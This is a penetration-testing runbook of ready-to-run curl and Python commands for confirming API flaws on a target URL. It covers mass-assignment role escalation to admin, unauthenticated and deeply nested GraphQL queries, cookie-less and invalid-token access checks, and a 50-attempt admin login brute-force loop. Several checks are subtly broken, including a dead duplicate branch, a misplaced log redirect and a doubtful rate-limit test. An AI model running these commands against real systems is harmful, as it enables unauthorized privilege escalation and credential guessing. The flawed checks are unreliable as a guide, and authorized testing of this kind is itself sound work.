# API Verify Runbook

## Purpose
Confirm API vulnerabilities with high confidence. Prove mass assignment, GraphQL abuse, auth bypass, and parameter tampering.

## Variables
- `$TARGET_URL` — API endpoint under test
- `$OUTDIR` — output directory
- `$COOKIE_JAR` — authenticated session
- `$EVIDENCE_DIR` — `$OUTDIR/evidence/api`
- `$API_TYPE` — one of: graphql, rest, mass-assignment, rate-limit, auth-bypass

## Workflow A — Mass Assignment Verification

### A1. Create user with normal privileges first
```bash
curl -sk -X POST "$TARGET_URL/api/register" -H "Content-Type: application/json" -d '{"email":"test-verify@test.com","password":"Test123!","name":"Test User"}' -o "$EVIDENCE_DIR/mass-verify-register.json"
```

### A2. Attempt role escalation via profile update
```bash
curl -sk -b "$COOKIE_JAR" -X PATCH "$TARGET_URL/api/user/me" -H "Content-Type: application/json" -d '{"role":"admin","isAdmin":true,"permissions":["*"],"plan":"enterprise"}' -o "$EVIDENCE_DIR/mass-verify-escalate.json"
python3 -c "
import json
d=json.load(open('$EVIDENCE_DIR/mass-verify-escalate.json'))
if d.get('role')=='admin' or d.get('isAdmin')==True:
    print('MASS ASSIGNMENT VERIFIED: privilege escalated')
elif d.get('role')=='admin' or d.get('isAdmin'):
    print('MASS ASSIGNMENT VERIFIED: role field accepted')
else:
    print('No mass assignment detected on role fields')
" >> "$EVIDENCE_DIR/verify-log.txt"
```

### A3. Verify escalated privilege is real
```bash
curl -sk -b "$COOKIE_JAR" "$TARGET_URL/api/admin/users" -o "$EVIDENCE_DIR/mass-verify-admin-access.json"
HTTP_CODE=$(curl -sk -o /dev/null -w "%{http_code}" -b "$COOKIE_JAR" "$TARGET_URL/api/admin/users")
echo "Admin endpoint HTTP code: $HTTP_CODE" >> "$EVIDENCE_DIR/verify-log.txt"
```

## Workflow B — GraphQL Verification

### B1. Extract all mutations from introspection
```bash
python3 -c "
import json
d=json.load(open('$OUTDIR/gql-full-introspection.json'))
schema=d.get('data',{}).get('__schema',{})
mut_type=schema.get('mutationType',{}).get('name','Mutation')
types=schema.get('types',[])
for t in types:
    if t.get('name')==mut_type:
        for f in t.get('fields',[]):
            print(f.get('name'))
" > "$EVIDENCE_DIR/gql-mutations.txt"
cat "$EVIDENCE_DIR/gql-mutations.txt"
```

### B2. Test authenticated-only queries without auth
```bash
curl -sk "$TARGET_URL/graphql" -H "Content-Type: application/json" -d '{"query":"{me{id email role}}"}' -o "$EVIDENCE_DIR/gql-unauth-query.json"
python3 -c "
import json
d=json.load(open('$EVIDENCE_DIR/gql-unauth-query.json'))
if d.get('data',{}).get('me'):
    print('GRAPHQL AUTH BYPASS VERIFIED: me query works without auth token')
elif d.get('errors'):
    print('OK: auth enforced on me query')
" >> "$EVIDENCE_DIR/verify-log.txt"
```

### B3. Test for query depth abuse
```bash
curl -sk "$TARGET_URL/graphql" -H "Content-Type: application/json" -d '{"query":"{user{posts{comments{author{posts{comments{author{name}}}}}}}}"}' -o "$EVIDENCE_DIR/gql-depth-check.txt"
grep -qiE 'max depth|query too deep|too complex' "$EVIDENCE_DIR/gql-depth-check.txt" && echo "GraphQL depth limited" || echo "GraphQL NO DEPTH LIMIT" >> "$EVIDENCE_DIR/verify-log.txt"
```

## Workflow C — Auth Bypass on API Verification

### C1. Try cookie-less access to every endpoint
```bash
mkdir -p "$EVIDENCE_DIR/auth-bypass"
while read -r endpoint; do
  HTTP_CODE=$(curl -sk -o /dev/null -w "%{http_code}" "$TARGET_URL$endpoint")
  SIZE=$(curl -sk "$TARGET_URL$endpoint" | wc -c)
  echo "$HTTP_CODE $SIZE $endpoint" >> "$EVIDENCE_DIR/auth-bypass/access-check.txt"
  [ "$HTTP_CODE" = "200" ] && [ "$SIZE" -gt 100 ] && echo "AUTH BYPASS: $endpoint ($SIZE bytes)" >> "$EVIDENCE_DIR/verify-log.txt"
done < "$OUTDIR/all-api-endpoints.txt"
```

### C2. Test with invalid auth token
```bash
curl -sk -H "Authorization: Bearer invalid_token_xxxxx" "$TARGET_URL/api/user/me" -o "$EVIDENCE_DIR/auth-bypass/invalid-token.txt"
grep -qiE 'id|email|username' "$EVIDENCE_DIR/auth-bypass/invalid-token.txt" && echo "AUTH BYPASS: invalid token still works" >> "$EVIDENCE_DIR/verify-log.txt"
```

## Workflow D — Rate Limit Verification
```bash
for i in $(seq 1 50); do
  curl -sk -o /dev/null -w "%{http_code}\n" "$TARGET_URL/api/login" -d "user=admin&pass=wrong" >> "$EVIDENCE_DIR/rate-limit-brute.txt"
done
FIRST_200=$(grep -m1 "200" "$EVIDENCE_DIR/rate-limit-brute.txt" | head -1)
LAST_LINE=$(tail -1 "$EVIDENCE_DIR/rate-limit-brute.txt")
[ "$LAST_LINE" = "200" ] && echo "NO RATE LIMITING VERIFIED: 50 login attempts all processed" >> "$EVIDENCE_DIR/verify-log.txt"
```

## Verification Check
```bash
cat "$EVIDENCE_DIR/verify-log.txt"
```

## Stop Conditions
- Mass assignment confirmed with privilege escalation -> verified, stop
- GraphQL introspection fully exposed with sensitive mutations -> verified, stop
- Auth bypass confirmed on multiple endpoints -> verified, stop
- Rate limiting absent -> verified, stop
- All probes return proper auth enforcement -> not vulnerable

## Next Routing
- Verified -> `runbooks/04-impact-escalation.md`
- Cannot verify -> `runbooks/06-false-positive-filter.md`
